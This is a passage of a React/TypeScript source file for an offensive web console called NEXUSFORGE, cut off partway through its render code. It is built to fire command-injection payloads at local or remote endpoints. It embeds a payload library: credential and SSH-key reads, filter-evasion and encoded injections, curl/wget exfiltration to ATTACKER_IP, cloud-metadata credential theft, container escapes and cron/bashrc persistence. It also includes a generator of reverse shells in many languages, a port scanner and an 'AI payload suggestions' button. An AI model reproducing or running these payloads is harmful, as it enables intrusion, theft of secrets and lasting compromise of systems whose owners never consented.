import React, { useState, useRef, useEffect, useCallback } from "react";
import {
  useGetHubStatus,
  useGetEngines,
  useGetLogs,
  useClearLogs,
  useGetSuggestions,
  getGetHubStatusQueryKey,
  getGetEnginesQueryKey,
  getGetLogsQueryKey,
  getGetSuggestionsQueryKey,
} from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";

const ENGINE_OPTIONS = [
  { value: "bash/bash",           label: "Bash" },
  { value: "node/exec",           label: "Node exec()" },
  { value: "node/spawn",          label: "Node spawn()" },
  { value: "python/subprocess",   label: "Python subprocess" },
  { value: "python/os_system",    label: "Python os.system" },
  { value: "php/system",          label: "PHP system()" },
  { value: "php/exec",            label: "PHP exec()" },
  { value: "php/shell_exec",      label: "PHP shell_exec()" },
  { value: "java/runtime",        label: "Java Runtime.exec" },
  { value: "java/processbuilder", label: "Java ProcessBuilder" },
  { value: "cpp/system",          label: "C++ system()" },
  { value: "cpp/popen",           label: "C++ popen()" },
  { value: "powershell/powershell", label: "PowerShell" },
];

const MODES = ["classic", "blind", "oob", "quantum"] as const;

const PAYLOAD_LIBRARY = [
  {
    cat: "RECON",
    col: "text-lime-400",
    p: [
      "id && uname -a && hostname",
      "cat /proc/version && cat /etc/os-release 2>/dev/null",
      "ps auxf 2>/dev/null | head -30",
      "ss -tulpn 2>/dev/null || netstat -tulpn",
      "env | grep -v '^_' | sort",
      "df -h && free -m",
      "ls -la / && ls -la /home/ 2>/dev/null",
      "cat /proc/net/tcp && cat /proc/net/tcp6 2>/dev/null",
      "find / -name '*.conf' 2>/dev/null | head -10",
      "ip a 2>/dev/null || ifconfig 2>/dev/null",
      "route -n 2>/dev/null || ip route",
      "cat /proc/1/cmdline | tr '\\0' ' '",
    ],
  },
  {
    cat: "FILE READ",
    col: "text-yellow-400",
    p: [
      "cat /etc/passwd",
      "cat /etc/shadow 2>/dev/null",
      "cat /etc/hosts && cat /etc/resolv.conf",
      "cat ~/.ssh/id_rsa 2>/dev/null",
      "cat ~/.ssh/authorized_keys 2>/dev/null",
      "cat ~/.bash_history 2>/dev/null | tail -30",
      "find / -name '*.env' 2>/dev/null | xargs cat 2>/dev/null | head -50",
      "cat /proc/self/environ | tr '\\0' '\\n'",
      "find / -name '*.pem' -o -name 'id_rsa' -o -name '*.key' 2>/dev/null | head -10",
      "cat /var/log/auth.log 2>/dev/null | tail -30",
      "cat /root/.bash_history 2>/dev/null",
      "find / -name 'wp-config.php' -o -name '.htpasswd' -o -name 'config.php' 2>/dev/null | xargs cat 2>/dev/null",
    ],
  },
  {
    cat: "RCE CHAINS",
    col: "text-red-400",
    p: [
      "id; whoami; uname -a",
      "id && cat /etc/passwd && ls -la /",
      "127.0.0.1 && id",
      "127.0.0.1; id",
      "127.0.0.1 | id",
      "127.0.0.1 || id",
      "127.0.0.1`id`",
      "$(id)",
      "$(cat /etc/passwd)",
      "id && ls /root 2>/dev/null",
      "id;ls${IFS}-la",
      "id%0aid",
      "id%0d%0awhoami",
    ],
  },
  {
    cat: "WAF BYPASS",
    col: "text-orange-400",
    p: [
      "${IFS}id${IFS}",
      "i''d",
      "w'h'o'a'm'i",
      "cat${IFS}/etc/passwd",
      "/bin/c?t${IFS}/etc/pass*",
      "/???/??t${IFS}/etc/pass*",
      "cat${IFS}/e??/pa?sw?",
      "l\\s${IFS}-la",
      "who$(echo${IFS}a)mi",
      "`echo${IFS}id|sh`",
      "$(printf${IFS}'\\x69\\x64')",
      "bash${IFS}-c${IFS}'id'",
      "{id,}",
      "{cat,/etc/passwd}",
      "bash<<<id",
      "X=id;$X",
      "_c=ca;_t=t;$_c$_t${IFS}/etc/passwd",
      "c${IFS:0:0}at${IFS}/etc/passwd",
      "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh)",
      "/bin/b??h<<<id",
      "sc''ript/c''md<<<id",
    ],
  },
  {
    cat: "ENCODING",
    col: "text-cyan-400",
    p: [
      "$(printf '\\x69\\x64')",
      "$(printf '\\151\\144')",
      "bash<<<$(base64 -d<<<aWQ=)",
      "echo aWQ= | base64 -d | bash",
      "eval$(printf '\\x20$(printf \\x69\\x64)')",
      "{echo,aWQ=}|{base64,-d}|bash",
      "python3 -c \"import os;os.system('\\x69\\x64')\"",
      "perl -e 'system(\"\\x69\\x64\")'",
      "X=$'\\x69\\x64';$X",
      "$(echo -e '\\x69\\x64')",
      "eval \"$(printf '\\x69\\x64')\"",
      "{echo,d2hvYW1p}|{base64,-d}|{bash,}",
    ],
  },
  {
    cat: "BLIND TIME",
    col: "text-yellow-300",
    p: [
      "id && sleep 5",
      "ping -c 5 127.0.0.1",
      "id; sleep 7",
      "id||(sleep 9)",
      "bash -c 'sleep 6'",
      "$(sleep 5)",
      "`sleep 5`",
      "id && bash -c 'for i in {1..5}; do sleep 1; done'",
      "id & sleep 8 & wait",
      ";sleep${IFS}9;",
      "&&sleep${IFS}7&&",
    ],
  },
  {
    cat: "OOB EXFIL",
    col: "text-purple-400",
    p: [
      "id && curl -sk 'http://ATTACKER_IP:ATTACKER_PORT/?x='$(id|base64 -w0) &",
      "whoami && wget -qO- 'http://ATTACKER_IP:ATTACKER_PORT/?u='$(whoami) &",
      "nslookup $(whoami).ATTACKER_IP",
      "cat /etc/passwd | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ --data-binary @-",
      "curl -sk -d \"$(env|base64 -w0)\" http://ATTACKER_IP:ATTACKER_PORT/ &",
      "dig +short $(id|base64|head -c30|tr -d =).ATTACKER_IP &",
      "curl -sk http://ATTACKER_IP:ATTACKER_PORT/$(cat /etc/passwd|base64 -w0|head -c150)",
      "curl -sk --upload-file /etc/passwd http://ATTACKER_IP:ATTACKER_PORT/",
    ],
  },
  {
    cat: "QUANTUM",
    col: "text-fuchsia-400",
    p: [
      "bash<<<$(base64 -d<<<aWQ=)",
      "eval $(echo 'aWQ=' | base64 -d)",
      "bash -c {echo,aWQ=}|{base64,-d}|bash",
      "X=$'\\x69\\x64';$X",
      "$(printf '\\x62\\x61\\x73\\x68') -c id",
      "{echo,d2hvYW1p}|{base64,-d}|{bash,}",
      "_=$(echo aWQ=|base64 -d);eval$IFS$_",
      "python3 -c \"import base64,os;os.system(base64.b64decode('aWQ=').decode())\"",
    ],
  },
  {
    cat: "PRIVESC",
    col: "text-red-500",
    p: [
      "sudo -l",
      "find / -perm -4000 -type f 2>/dev/null",
      "find / -perm -2000 -type f 2>/dev/null",
      "find / -writable -type d 2>/dev/null | head -10",
      "cat /etc/crontab && ls /etc/cron* 2>/dev/null",
      "getcap -r / 2>/dev/null",
      "cat /etc/sudoers 2>/dev/null",
      "find / -name 'authorized_keys' 2>/dev/null",
      "ls -la /etc/passwd /etc/shadow /etc/sudoers",
      "strings /usr/bin/sudo 2>/dev/null | grep -i pass | head -5",
    ],
  },
  {
    cat: "CLOUD META",
    col: "text-sky-400",
    p: [
      "curl -sk http://169.254.169.254/latest/meta-data/",
      "curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "curl -sk http://169.254.169.254/computeMetadata/v1/ -H 'Metadata-Flavor:Google'",
      "curl -sk http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'",
      "curl -sk http://100.100.100.200/latest/meta-data/",
      "curl -sk http://192.0.0.192/openstack/latest/meta_data.json",
      "curl -sk http://169.254.169.254/latest/user-data",
      "curl -sk http://169.254.170.2/v2/credentials",
    ],
  },
  {
    cat: "CONTAINER",
    col: "text-teal-400",
    p: [
      "cat /proc/1/cgroup | grep -i docker",
      "ls -la /.dockerenv 2>/dev/null && echo 'in docker'",
      "cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
      "env | grep -iE 'kube|k8s|docker|container'",
      "nsenter --target 1 --mount --uts --ipc --net --pid -- bash 2>/dev/null",
      "find / -name 'docker.sock' 2>/dev/null",
      "curl -sk --unix-socket /run/docker.sock http://localhost/containers/json",
      "cat /proc/self/status | grep -i cap",
      "mount | grep -v 'proc\\|sys\\|dev'",
    ],
  },
  {
    cat: "PERSISTENCE",
    col: "text-rose-400",
    p: [
      "echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> /etc/crontab",
      "echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' >> ~/.bashrc",
      "(crontab -l 2>/dev/null; echo '@reboot bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1') | crontab -",
      "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
      "echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' > /tmp/.x && chmod +x /tmp/.x && /tmp/.x &",
    ],
  },
];

function buildReverseShells(ip: string, port: string) {
  const i = ip || "ATTACKER_IP";
  const p = port || "4444";
  return [
    { name: "Bash TCP",      cmd: `bash -i >& /dev/tcp/${i}/${p} 0>&1` },
    { name: "Bash UDP",      cmd: `bash -i >& /dev/udp/${i}/${p} 0>&1` },
    { name: "NC Mkfifo",     cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f` },
    { name: "NC -e",         cmd: `nc -e /bin/sh ${i} ${p}` },
    { name: "Python3",       cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { name: "Python3 b64",   cmd: `python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXCIke2l9XCIsJHtwfSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbXCIvYmluL3NoXCIsXCItaVwiXSk='.replace(b'${i}',b'${i}').replace(b'${p}',b'${p}')))"` },
    { name: "Perl",          cmd: `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
    { name: "PHP",           cmd: `php -r '$s=fsockopen("${i}",${p});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
    { name: "Ruby",          cmd: `ruby -rsocket -e 'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    { name: "Socat",         cmd: `socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${i}:${p}` },
    { name: "AWK",           cmd: `awk 'BEGIN{s="/inet/tcp/0/${i}/${p}";for(;;){if((s|&getline c)<=0)break;while((c|getline)>0)print|&s;close(c)}}'` },
    { name: "PowerShell",    cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object Net.Sockets.TCPClient("${i}",${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()` },
    { name: "OpenSSL",       cmd: `openssl s_client -quiet -connect ${i}:${p}|/bin/bash 2>&1|openssl s_client -quiet -connect ${i}:$((${p}+1))` },
  ];
}

const MODE_COLOR: Record<string, string> = {
  classic: "text-lime-400",
  blind:   "text-yellow-400",
  oob:     "text-orange-400",
  quantum: "text-fuchsia-400",
};

export default function MainLab() {
  const queryClient = useQueryClient();

  const [cmd, setCmd]           = useState("");
  const [engine, setEngine]     = useState("bash/bash");
  const [mode, setMode]         = useState("classic");
  const [target, setTarget]     = useState("");
  const [attackerIp, setAttIp]  = useState("");
  const [attackerPort, setAttPort] = useState("4444");

  const [output, setOutput]     = useState("NEXUSFORGE v5.0 — WebSocket Streaming\n");
  const [isRunning, setRunning] = useState(false);
  const [score, setScore]       = useState(0);
  const [chain, setChain]       = useState<string[]>([]);
  const [analytics, setAnalytics] = useState({ total: 0, blind: 0, oob: 0, quantum: 0 });
  const [copyId, setCopyId]     = useState<string | null>(null);
  const [libTab, setLibTab]     = useState(0);

  const [scanMode, setScanMode] = useState<"common" | "web" | "full">("common");
  const [isScanning, setScanning] = useState(false);
  const [openPorts, setOpenPorts] = useState<number[]>([]);

  const [injectionUrl,   setInjectionUrl]   = useState("");
  const [injectParam,    setInjectParam]     = useState("cmd");
  const [httpMethod,     setHttpMethod]      = useState("GET");
  const [customHeaders,  setCustomHeaders]   = useState("");

  const termRef   = useRef<HTMLDivElement>(null);
  const wsRef     = useRef<WebSocket | null>(null);
  const scanWsRef = useRef<WebSocket | null>(null);

  const { data: hubStatus } = useGetHubStatus({ query: { refetchInterval: 10000, queryKey: getGetHubStatusQueryKey() } });
  const { data: engines }   = useGetEngines({ query: { refetchInterval: 20000, queryKey: getGetEnginesQueryKey() } });
  const { data: logs }      = useGetLogs({ query: { refetchInterval: 3000, queryKey: getGetLogsQueryKey() } });
  const clearLogs           = useClearLogs();

  const suggestParams = { mode, cmd };
  const { data: suggestions, refetch: fetchSuggestions } = useGetSuggestions(suggestParams, {
    query: { enabled: false, queryKey: getGetSuggestionsQueryKey(suggestParams) },
  });

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [output]);

  const handleScan = useCallback(() => {
    if (!target.trim() || isScanning) return;
    scanWsRef.current?.close();
    scanWsRef.current = null;
    setOpenPorts([]);

    setOutput(prev => prev + `\nroot@nexus:~# portscan ${target} --mode ${scanMode}\n`);
    setScanning(true);

    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/scan`);
    scanWsRef.current = ws;

    ws.onopen = () => {
      ws.send(JSON.stringify({ target, mode: scanMode }));
    };

    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data as string) as {
        type: string; chunk?: string; message?: string; code?: number; openPorts?: number[];
      };
      if (msg.type === "data" && msg.chunk) {
        setOutput(prev => prev + msg.chunk);
      } else if (msg.type === "end") {
        setOpenPorts(msg.openPorts ?? []);
        setScanning(false);
        setOutput(prev => prev + "\n");
        scanWsRef.current = null;
      } else if (msg.type === "error") {
        setOutput(prev => prev + `[SCAN ERROR] ${msg.message}\n\n`);
        setScanning(false);
        scanWsRef.current = null;
      }
    };

    ws.onerror = () => { setOutput(prev => prev + `[SCAN] connection error\n\n`); setScanning(false); };
    ws.onclose = () => { setScanning(false); scanWsRef.current = null; };
  }, [target, scanMode, isScanning]);

  const handleInject = useCallback(() => {
    if (!cmd.trim() || isRunning) return;
    wsRef.current?.close();
    wsRef.current = null;

    const isRemote = injectionUrl.trim().length > 0;
    const prompt = isRemote
      ? `[REMOTE] ${httpMethod} ${injectionUrl.trim()} ?${injectParam}=`
      : `root@${target || "nexus"}:~# `;
    setOutput(prev => prev + `${prompt}${cmd}\n`);
    setRunning(true);
    setChain(cmd.split(/[;&|`$(){}]/).map(s => s.trim()).filter(s => s.length > 1 && s.length < 60));

    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/exec`);
    wsRef.current = ws;

    ws.onopen = () => {
      ws.send(JSON.stringify({
        cmd, engine, mode, target,
        injectionUrl: injectionUrl.trim(),
        injectParam,
        httpMethod,
        customHeaders,
        attackerIp,
        attackerPort,
      }));
    };

    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data as string) as {
        type: string; chunk?: string; message?: string; code?: number; elapsed?: number;
      };
      if (msg.type === "data" && msg.chunk) {
        setOutput(prev => prev + msg.chunk);
      } else if (msg.type === "end") {
        const elapsed = msg.elapsed ?? 0;
        setScore(prev => prev + 25 + (elapsed > 3000 ? 55 : 0));
        setAnalytics(prev => ({
          total: prev.total + 1,
          blind:   mode === "blind"   ? prev.blind   + 1 : prev.blind,
          oob:     mode === "oob"     ? prev.oob     + 1 : prev.oob,
          quantum: mode === "quantum" ? prev.quantum + 1 : prev.quantum,
        }));
        setOutput(prev => prev + `\n[exit:${msg.code ?? -1} | ${elapsed}ms]\n\n`);
        setRunning(false);
        queryClient.invalidateQueries({ queryKey: ["/api/logs"] });
      } else if (msg.type === "error") {
        setOutput(prev => prev + `[ERROR] ${msg.message}\n\n`);
        setRunning(false);
      }
    };

    ws.onerror = () => { setOutput(prev => prev + `[WS] connection error\n\n`); setRunning(false); };
    ws.onclose = () => { setRunning(false); wsRef.current = null; };
  }, [cmd, engine, mode, target, injectionUrl, injectParam, httpMethod, customHeaders, attackerIp, attackerPort, isRunning, queryClient]);

  useEffect(() => {
    const h = (e: KeyboardEvent) => { if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) handleInject(); };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, [handleInject]);

  const sub = (s: string) =>
    s.replace(/ATTACKER_IP/g,   attackerIp   || "ATTACKER_IP")
     .replace(/ATTACKER_PORT/g, attackerPort || "4444");

  const copy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopyId(id);
    setTimeout(() => setCopyId(null), 1400);
  };

  const shells = buildReverseShells(attackerIp, attackerPort);
  const libEntry = PAYLOAD_LIBRARY[libTab]!;

  return (
    <div className="min-h-screen bg-black text-zinc-300 font-mono flex flex-col">
      <header className="flex items-center justify-between px-4 py-2 border-b border-red-900/50 bg-zinc-950 shrink-0 flex-wrap gap-2">
        <div className="flex items-center gap-3 flex-wrap text-xs">
          <span className="text-red-500 font-bold tracking-widest text-sm">NEXUSFORGE</span>
          <span className="text-zinc-700">|</span>
          <span className={`w-2 h-2 rounded-full inline-block ${hubStatus?.status === "online" ? "bg-green-500" : "bg-zinc-600"}`} />
          <span className="text-zinc-500 uppercase">{hubStatus?.status ?? "connecting"}</span>
          {injectionUrl
            ? <><span className="text-zinc-700">|</span><span className="text-orange-400 font-bold">REMOTE: {injectionUrl.slice(0, 40)}{injectionUrl.length > 40 ? "…" : ""}</span></>
            : target && <><span className="text-zinc-700">|</span><span className="text-red-400">TGT: {target}</span></>
          }
          {attackerIp && <><span className="text-zinc-700">|</span><span className="text-purple-400">C2: {attackerIp}:{attackerPort}</span></>}
        </div>
        <div className="flex items-center gap-2 text-xs">
          {isRunning && (
            <button onClick={() => { wsRef.current?.close(); setRunning(false); setOutput(prev => prev + "[KILLED]\n\n"); }}
              className="px-3 py-1 border border-red-700 text-red-500 hover:bg-red-950/40 uppercase">
              KILL
            </button>
          )}
          <span className="border border-red-900 px-3 py-1 text-red-400 font-bold">
            {String(score).padStart(6, "0")}
          </span>
        </div>
      </header>

      <div className="flex-1 flex flex-col md:flex-row overflow-hidden min-h-0">
        <aside className="w-full md:w-72 border-r border-red-900/30 bg-zinc-950 flex flex-col overflow-y-auto shrink-0">
          <div className="p-3 space-y-3">

            <div className="grid grid-cols-2 gap-1.5">
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Engine</div>
                <select
                  value={engine}
                  onChange={e => setEngine(e.target.value)}
                  className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700"
                >
                  {ENGINE_OPTIONS.map(o => {
                    const k = o.value.split("/")[0] as keyof typeof engines;
                    const ok = engines ? engines[k] !== false : true;
                    return <option key={o.value} value={o.value}>{o.label}{!ok ? " [N/A]" : ""}</option>;
                  })}
                </select>
              </div>
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Mode</div>
                <div className="grid grid-cols-2 gap-0.5">
                  {MODES.map(m => (
                    <button key={m} onClick={() => setMode(m)}
                      className={`py-1 text-[10px] uppercase border transition-colors ${mode === m ? "border-red-600 text-red-400 bg-red-950/30" : "border-zinc-800 text-zinc-600 hover:border-zinc-600"}`}>
                      {m}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-1.5">
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Target IP / Host</div>
                <input
                  type="text" value={target} onChange={e => setTarget(e.target.value)}
                  placeholder="192.168.1.1"
                  className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-red-300 placeholder-zinc-700 focus:outline-none focus:border-red-700"
                  autoComplete="off"
                />
              </div>
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Attacker IP</div>
                <input
                  type="text" value={attackerIp} onChange={e => setAttIp(e.target.value)}
                  placeholder="10.10.14.1"
                  className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-purple-300 placeholder-zinc-700 focus:outline-none focus:border-purple-800"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1">Listen Port</div>
              <input
                type="text" value={attackerPort} onChange={e => setAttPort(e.target.value)}
                placeholder="4444"
                className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-purple-300 placeholder-zinc-700 focus:outline-none focus:border-purple-800"
                autoComplete="off"
              />
            </div>

            <div className="border border-orange-900/50 bg-black p-2">
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[10px] text-orange-600 uppercase tracking-wider">HTTP Injection Target</span>
                {injectionUrl.trim() && <span className="text-[9px] text-orange-400 font-bold uppercase">REMOTE</span>}
              </div>
              <div className="text-[9px] text-zinc-600 mb-1.5">Vulnerable endpoint — payload injected into param</div>
              <input
                type="text"
                value={injectionUrl}
                onChange={e => setInjectionUrl(e.target.value)}
                placeholder="http://target.com/api/search"
                className="w-full bg-black border border-orange-900/40 px-2 py-1 text-[11px] text-orange-300 placeholder-zinc-700 focus:outline-none focus:border-orange-600 mb-1.5"
                autoComplete="off"
                spellCheck={false}
              />
              <div className="grid grid-cols-2 gap-1.5 mb-1.5">
                <div>
                  <div className="text-[9px] text-zinc-600 uppercase mb-0.5">Parameter</div>
                  <input
                    type="text"
                    value={injectParam}
                    onChange={e => setInjectParam(e.target.value)}
                    placeholder="cmd"
                    className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-orange-300 placeholder-zinc-700 focus:outline-none focus:border-orange-700"
                    autoComplete="off"
                  />
                </div>
                <div>
                  <div className="text-[9px] text-zinc-600 uppercase mb-0.5">Method</div>
                  <select
                    value={httpMethod}
                    onChange={e => setHttpMethod(e.target.value)}
                    className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-orange-300 focus:outline-none focus:border-orange-700"
                  >
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                    <option value="JSON">JSON</option>
                    <option value="PUT">PUT</option>
                  </select>
                </div>
              </div>
              <div className="text-[9px] text-zinc-600 uppercase mb-0.5">Custom Headers (Key: Value)</div>
              <textarea
                value={customHeaders}
                onChange={e => setCustomHeaders(e.target.value)}
                placeholder={"Cookie: session=abc\nX-Forwarded-For: 127.0.0.1"}
                className="w-full h-12 bg-black border border-zinc-800 px-2 py-1 text-[10px] text-zinc-400 placeholder-zinc-700 focus:outline-none focus:border-zinc-600 resize-none font-mono"
                spellCheck={false}
              />
              {injectionUrl.trim() && (
                <button
                  onClick={() => { setInjectionUrl(""); setCustomHeaders(""); }}
                  className="mt-1.5 w-full text-[9px] text-zinc-600 hover:text-red-400 uppercase"
                >
                  clear — switch to local execution
                </button>
              )}
            </div>

            <div className="border border-zinc-800 bg-black p-2">
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[10px] text-zinc-500 uppercase tracking-wider">Port Scanner</span>
                {isScanning && <span className="text-[10px] text-cyan-400 animate-pulse">SCANNING...</span>}
              </div>
              <div className="flex gap-0.5 mb-2">
                {(["common", "web", "full"] as const).map(m => (
                  <button key={m} onClick={() => setScanMode(m)}
                    className={`flex-1 py-0.5 text-[9px] uppercase border transition-colors ${scanMode === m ? "border-cyan-700 text-cyan-400 bg-cyan-950/30" : "border-zinc-800 text-zinc-600 hover:border-zinc-700"}`}>
                    {m}
                  </button>
                ))}
              </div>
              <button
                onClick={isScanning ? () => { scanWsRef.current?.close(); setScanning(false); } : handleScan}
                disabled={!target.trim()}
                className={`w-full py-1.5 text-[11px] font-bold uppercase transition-colors disabled:opacity-30 ${isScanning ? "border border-red-700 text-red-500 hover:bg-red-950/40" : "bg-cyan-900/40 border border-cyan-700/60 text-cyan-400 hover:bg-cyan-900/70"}`}>
                {isScanning ? "ABORT SCAN" : "SCAN TARGET"}
              </button>
              {openPorts.length > 0 && (
                <div className="mt-2">
                  <div className="text-[9px] text-zinc-600 uppercase mb-1">{openPorts.length} open port(s)</div>
                  <div className="flex flex-wrap gap-1">
                    {openPorts.map(p => (
                      <button key={p} onClick={() => setCmd(`nc -zv ${target} ${p} 2>&1`)}
                        title={`Click to probe port ${p}`}
                        className="px-1.5 py-0.5 bg-cyan-950/40 border border-cyan-800/60 text-cyan-400 text-[9px] hover:bg-cyan-900/60 transition-colors">
                        {p}
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1">
                Payload <span className={`ml-1 ${MODE_COLOR[mode] ?? ""}`}>[ {mode} ]</span>
              </div>
              <textarea
                value={cmd}
                onChange={e => setCmd(e.target.value)}
                onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); handleInject(); } }}
                className="w-full h-24 bg-black border border-red-900/60 px-2 py-1.5 text-lime-400 font-mono text-[11px] focus:outline-none focus:border-red-500 resize-none"
                placeholder="Enter payload — Enter to fire, Shift+Enter for newline"
                spellCheck={false}
                autoComplete="off"
              />
              <div className="flex gap-1.5 mt-1">
                <button
                  onClick={handleInject}
                  disabled={isRunning || !cmd.trim()}
                  className={`flex-1 font-bold py-2 text-xs uppercase disabled:opacity-40 transition-colors ${
                    injectionUrl.trim()
                      ? "bg-orange-900/60 border border-orange-700 text-orange-300 hover:bg-orange-900"
                      : "bg-red-900 text-white hover:bg-red-800"
                  }`}
                >
                  {isRunning ? "STREAMING..." : injectionUrl.trim() ? "INJECT REMOTE" : "INJECT LOCAL"}
                </button>
                <button
                  onClick={() => fetchSuggestions()}
                  className="px-2.5 bg-zinc-900 border border-zinc-800 text-zinc-500 text-[10px] uppercase hover:bg-zinc-800 transition-colors"
                  title="AI payload suggestions"
                >
                  AI
                </button>
              </div>
              {suggestions && suggestions.length > 0 && (
                <div className="mt-1 space-y-0.5">
                  {suggestions.map((s, i) => (
                    <div key={i} onClick={() => setCmd(s)} title={s}
                      className="text-[10px] bg-zinc-900 text-lime-400 px-1.5 py-1 border border-zinc-800 cursor-pointer hover:bg-zinc-800 truncate">
                      {s}
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1.5">Reverse Shells</div>
              <div className="space-y-1 max-h-44 overflow-y-auto">
                {shells.map((rs, i) => (
                  <div key={i} className="border border-zinc-800 bg-black px-2 py-1">
                    <div className="flex justify-between items-center">
                      <span className="text-[10px] text-zinc-500">{rs.name}</span>
                      <div className="flex gap-2">
                        <button onClick={() => setCmd(rs.cmd)} className="text-[10px] text-zinc-600 hover:text-lime-400">USE</button>
                        <button onClick={() => copy(rs.cmd, `rs${i}`)}
                          className={`text-[10px] ${copyId === `rs${i}` ? "text-green-400" : "text-zinc-600 hover:text-red-400"}`}>
                          {copyId === `rs${i}` ? "COPIED" : "COPY"}
                        </button>
                      </div>
                    </div>
                    <div className="text-[9px] text-zinc-700 truncate mt-0.5">{rs.cmd}</div>
                  </div>
                ))}
              </div>
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1.5">Payload Library</div>
              <div className="flex flex-wrap gap-1 mb-2">
                {PAYLOAD_LIBRARY.map((lib, i) => (
                  <button key={i} onClick={() => setLibTab(i)}
                    className={`text-[9px] px-1.5 py-0.5 border uppercase transition-colors ${libTab === i ? `border-red-700 ${lib.col} bg-red-950/20` : "border-zinc-800 text-zinc-600 hover:border-zinc-700"}`}>
                    {lib.cat}
                  </button>
                ))}
              </div>
              <div className="flex flex-wrap gap-1">
                {libEntry.p.map((p, j) => (
                  <button key={j} onClick={() => setCmd(sub(p))} title={sub(p)}
                    className={`px-1.5 py-0.5 bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 text-[9px] ${libEntry.col} max-w-full`}
                    style={{ maxWidth: "100%" }}>
                    {p.length > 32 ? p.slice(0, 32) + "…" : p}
                  </button>
                ))}
              </div>
            </div>

          </div>
        </aside>

        <main className="flex-1 flex flex-col min-w-0 min-h-0">
          <div className="flex-1 flex flex-col min-h-0">
            <div className="flex items-center justify-between bg-zinc-950 border-b border-zinc-900 px-3 py-1.5 shrink-0">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-red-500" />
                <span className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
                <span className="w-2.5 h-2.5 rounded-full bg-green-500" />
                <span className="text-xs text-zinc-500 ml-2">root@{target || "nexus"}:~#</span>
                {isRunning && <span className="text-xs text-red-400 animate-pulse ml-1">LIVE</span>}
              </div>
              <div className="flex items-center gap-3 text-xs">
                <span className={MODE_COLOR[mode] ?? "text-zinc-400"}>{mode.toUpperCase()}</span>
                <span className="text-zinc-600">{engine}</span>
                <button onClick={() => { setOutput(""); setChain([]); }}
                  className="text-zinc-700 hover:text-red-400 uppercase">CLR</button>
              </div>
            </div>

            <div ref={termRef} className="flex-1 overflow-y-auto p-3 font-mono text-xs leading-relaxed bg-black">
